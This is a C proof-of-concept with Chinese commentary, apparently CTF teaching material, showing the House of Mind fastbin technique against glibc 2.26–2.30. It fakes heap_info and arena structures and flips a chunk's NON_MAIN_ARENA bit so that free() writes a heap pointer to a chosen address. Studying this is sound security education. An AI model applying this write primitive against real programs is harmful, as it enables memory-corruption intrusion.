/*
 * 中文导读（CTF 版）：本文件演示 house_of_mind 手法，标注的适用范围是
 * glibc 2.26～2.30。它借助按 HEAP_MAX_SIZE 对齐的堆布局，再单字节改写
 * chunk size 里的 NON_MAIN_ARENA 位来伪造 arena 归属，以此模拟漏洞。
 * 核心流程是伪造 heap_info/malloc_state，让 free 把 chunk 地址写进
 * fake_arena.fastbinsY 里攻击者选定的任意位置。成功的判据是 target 处
 * 拿到了一个堆指针；2.43 删除了 fastbin 的收发路径之后，这个 fastbin
 * 版本就彻底失效了。
 *
 * 阅读约定：malloc 返回的是用户可写的数据区，源码里通常 p[-1] 是 size
 * 字段，p[-2] 是 prev_size 字段。文件里所有故意构造的 UAF、越界和
 * double free 都只是在模拟漏洞，不是正常的 C 语言用法。具体的版本范围
 * 以本目录 README 和验证矩阵为准；如果目标发行版对补丁做了回移，还是
 * 要按实际 libc 源码重新判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

/*
 * House of Mind：fastbin 变体
 * ==============================
 *
 * 这个变体继承了经典 House of Mind 的核心思路：伪造一个非主 arena，让
 * 分配器在 free 时把本该写入 arena 管理结构的堆指针，写到攻击者自己选定
 * 的位置。这里走的是 fastbin 的收链路径，得到的效果是"把被释放 chunk 的
 * 地址写到某个位置"的任意地址写原语；如果只是想写入一个较大的非零值，
 * 也可以把它理解成类似旧版 unsorted-bin attack 的受限写，但能写入堆指针
 * 通常价值更高。
 *
 * 原始资料：
 * https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt
 * https://maxwelldulin.com/BlogPost?post=2257705984
 *
 * chunk size 字段的低三位分别承载 PREV_INUSE、IS_MMAPPED 和
 * NON_MAIN_ARENA 这三个标志位。本手法只把 NON_MAIN_ARENA 位置一，不改变
 * 真实的 chunk size。这样一来，_int_free 就会调用 arena_for_chunk(p) 去
 * 查找这个 chunk 所属的 arena，而不是直接固定用 main_arena。非主 arena
 * 的定位逻辑可以概括成：
 *
 *     heap_for_ptr(ptr) = ptr 按 HEAP_MAX_SIZE 向下对齐；
 *     arena 选择结果：arena_for_chunk(ptr) = heap_for_ptr(ptr)->ar_ptr。
 *
 * heap_info 结构体的第一个字段 ar_ptr 正好就是 malloc_state 的指针。攻击者
 * 先把某个可控的堆地址一路推进到 HEAP_MAX_SIZE 的边界上，在那里伪造出一个
 * heap_info，再让它的 ar_ptr 指向目标地址前方伪造的 malloc_state。等
 * free 把受害块挂进 fake_arena->fastbinsY[fastbin_index(size)] 时，目标
 * 位置上就会被写入受害块的地址。
 *
 * 对照源码：
 * https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48
 * https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127
 *
 * 本 PoC 的具体步骤：
 * 1. 分配内存直到到达一个可以事先算出来的 HEAP_MAX_SIZE 对齐边界，取得
 *    伪 heap_info 应该落在的位置；
 * 2. 在可控内存里伪造一个 malloc_state，并把 system_mem 设成一个足够大
 *    的合法值；
 * 3. 在 heap_info 偏移 0 处写入伪 arena 的 ar_ptr；
 * 4. 只把 fastbin victim 的 NON_MAIN_ARENA 位置一，不动其他位；
 * 5. free(victim)，观察 victim 的地址是否被写进了 fake_arena 对应的
 *    fastbinsY 槽里。
 *
 * 所需的原语与约束：
 * - 需要一次堆地址泄漏来计算对齐边界；如果是特殊的堆喷场景，也可以用
 *   概率布局代替这次泄漏；
 * - 需要能做大量可控分配，才能把 brk 堆一路推进到目标边界；
 * - 需要能对 chunk size 做单字节覆盖，并且这个块最终要走 fastbin 路径；
 *   有 tcache 的版本，要先把对应 tcache 填满；
 * - fake_arena->system_mem 必须大于被释放 chunk 的 size，否则
 *   next-size/system_mem 检查会把它判定为非法；
 * - victim 的后一个物理块也必须有合法的 size，也就是大于等于 MINSIZE
 *   且小于上界字段 fake_arena->system_mem。
 *
 * 和经典的 unsorted-bin attack 相比，这里的写入通常不会直接破坏 malloc
 * 的全局双向链表；如果堆布局允许，还可以用不同的 fastbin size 对不同的
 * 槽重复写入。原始 PoC 与讲解作者是 Maxwell Dulin（Strikeout）。
 */

int main(){

	// 这两个常量分别决定堆段对齐的粒度，以及每次推进 brk 堆时用的请求大小。
	int HEAP_MAX_SIZE = 0x4000000;
	int MAX_SIZE = (128*1024) - 0x100; // 略低于默认的 mmap 阈值，确保大块还是走 brk 堆而不是被单独 mmap。

	// 先在普通堆块里预留一个 fake arena；target_loc 对准它对应的 fastbinsY 槽。
	uint8_t* fake_arena = malloc(0x1000);
	uint8_t* target_loc = fake_arena + 0x30;

	uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

	/*
	 * 往 fake malloc_state 的 system_mem 字段里写入一个足够大的值。
	 * _int_free 会拿 system_mem 当上界，去检查 victim 以及它后一块的
	 * size；如果保持为零，受害块会被判定为过大，还没走到 fastbin 收链
	 * 写入这一步就会中止。
	 */
	fake_arena[0x888] = 0xFF;
	fake_arena[0x889] = 0xFF;
	fake_arena[0x88a] = 0xFF;

	// 把目标 chunk 的地址往上推进一个 HEAP_MAX_SIZE，再向下对齐，就得到伪 heap_info 应在的边界。
	uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
	uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

	uint64_t* user_mem = malloc(MAX_SIZE);

	/*
	 * fake heap_info 必须真正落在 arena_for_chunk 会算出的那个对齐
	 * 边界上。下面连续申请略低于 mmap 阈值的大块来推动 brk，直到用户区
	 * 越过这个边界；这样一来，前面算出来的 fake_heap_info 地址就已经落
	 * 在攻击者可写的堆内存里了。
	 */
	while((uint64_t)user_mem < new_arena_value){
		user_mem = malloc(MAX_SIZE);
	}

	// 分配出最终的 victim；接下来只改它的 NON_MAIN_ARENA 位，再靠 free 触发目标写入。
	uint64_t* fastbin_chunk = malloc(0x50); // 请求 0x50，经 request2size 换算后物理尺寸是 0x60。
	uint64_t* chunk_ptr = fastbin_chunk - 2; // 从用户指针往回退两个 size_t，就拿到了 chunk 的 header。

	// 先填满 0x60 大小的 tcache；这样之后释放 victim 才会跳过 tcache，走到需要利用的 fastbin 路径上。
	uint64_t* tcache_chunks[7];
	for(int i = 0; i < 7; i++){
		tcache_chunks[i] = malloc(0x50);
	}
	for(int i = 0; i < 7; i++){
		free(tcache_chunks[i]);
	}

	/*
	 * 在 fake heap_info 的偏移 0 处写入 ar_ptr。ar_ptr 指向哪里，那里
	 * 就会被当成 malloc_state 的起点；真正的写入位置，还要看 fastbinsY
	 * 在这个结构体里的偏移，加上 fastbin_index(size) 算出来的槽号。不同
	 * 的 size 对应大约 0x8~0x40 范围内不同的槽，所以布置 fake arena 时
	 * 要反过来，先减去这个槽偏移，再确定结构体基址该放在哪。
	 * 2.23 源码入口：
	 * https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686
	 */

	fake_heap_info[0] = (uint64_t) fake_arena; // heap_info 的第一个字段就是 ar_ptr，让它指向 fake malloc_state。

	/*
	 * 漏洞触发点：这里只把 size 里的 NON_MAIN_ARENA 标志位置一，实际
	 * 尺寸还是保持 0x60。这样后一块的 size 检查依然符合真实的堆布局，
	 * 而 arena_for_chunk 会改走 fake heap_info->ar_ptr 这条路径，最终把
	 * victim 写进伪 arena 的 fastbin 里。
	 */
	chunk_ptr[1] = 0x60 | 0x4; // 0x4 就是 NON_MAIN_ARENA 标志位；其余尺寸位不动。

	//// 漏洞模拟到这里结束，接下来的 free 就是正常的分配器路径了。

	/*
	 * 2.26~2.30 的 malloc_state 里，fastbinsY 的起始偏移是 0x10；0x60
	 * 的 chunk 对应 fastbinsY[4]，数组下标又贡献了 0x20，所以实际写入
	 * 位置是 fake_arena+0x30。这个结构体偏移是随版本变化的量，必须依据
	 * 附件 libc 的 malloc_state 定义来确认，不能照搬 2.23 用的 0x28。
	 */

	free(fastbin_chunk); // free 会按照伪 ar_ptr 走收链逻辑，把这个堆指针写到 target_loc。

	// 对本版本的 0x60 victim 来说，实际命中的偏移是 0x30；用断言验证目标确实拿到了堆指针。

	assert(*((unsigned long *) (target_loc)) != 0);
}
